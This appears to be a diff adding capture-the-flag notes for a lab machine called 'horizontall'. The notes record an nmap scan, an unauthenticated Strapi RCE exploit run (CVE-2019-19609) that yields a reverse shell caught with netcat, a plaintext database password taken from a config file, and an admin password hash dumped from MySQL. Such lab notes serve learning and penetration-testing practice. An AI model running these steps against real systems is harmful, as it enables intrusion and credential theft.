@@ -1,0 +1,115 @@
+`└─$ nmap -p- -sSCV 10.10.11.105  --min-rate 999`
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 17:42 AEDT
+Nmap scan report for 10.10.11.105
+Host is up (0.16s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+r.a.get("http://api-prod.horizontall.htb/reviews")
+`└─$ curl http://api-prod.horizontall.htb/reviews`
+```
+[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}] 
+```
+
+http://api-prod.horizontall.htb/admin/init
+```
+{
+  "data": {
+    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
+    "currentEnvironment": "development",
+    "autoReload": false,
+    "strapiVersion": "3.0.0-beta.17.4"
+  }
+}
+```
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
+
+```
+└─$ python3 exploit.py http://api-prod.horizontall.htb/ 10.10.16.16 8821                                
+========================================================
+|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |
+========================================================
+[+] Checking Strapi CMS version
+[+] Looks like this exploit should work!
+[+] Executing exploit
+
+```
+
+```
+└─$ nc -nvlp 8821                              
+listening on [any] 8821 ...
+connect to [10.10.16.16] from (UNKNOWN) [10.10.11.105] 49208
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
+$ which python
+/usr/bin/python
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+`strapi@horizontall:/home/developer$ netstat -tnlp`
+```
+netstat -tnlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1959/node /usr/bin/ 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+```
+-rw-rw-r-- 1 strapi strapi 351 May 26  2021 /opt/strapi/myapi/config/environments/development/database.json
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+
+mysql> select * from strapi_administrator;
+select * from strapi_administrator;
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+| id | username | email                 | password                                                     | resetPasswordToken | blocked |
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+|  3 | admin    | admin@horizontall.htb | $2a$10$pm2qYImrsWq17NmIrSupE.WrgHU3ul2iLc5Suvkl3.m0KSWjPGCK. | NULL               |    NULL |
++----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
+1 row in set (0.00 sec)
+
+mysql> show tables;
+show tables;
++------------------------------+
+| Tables_in_strapi             |
++------------------------------+
+| core_store                   |
+| reviews                      |
+| strapi_administrator         |
+| upload_file                  |
+| upload_file_morph            |
+| users-permissions_permission |
+| users-permissions_role       |
+| users-permissions_user       |
++------------------------------+
+8 rows in set (0.01 sec)
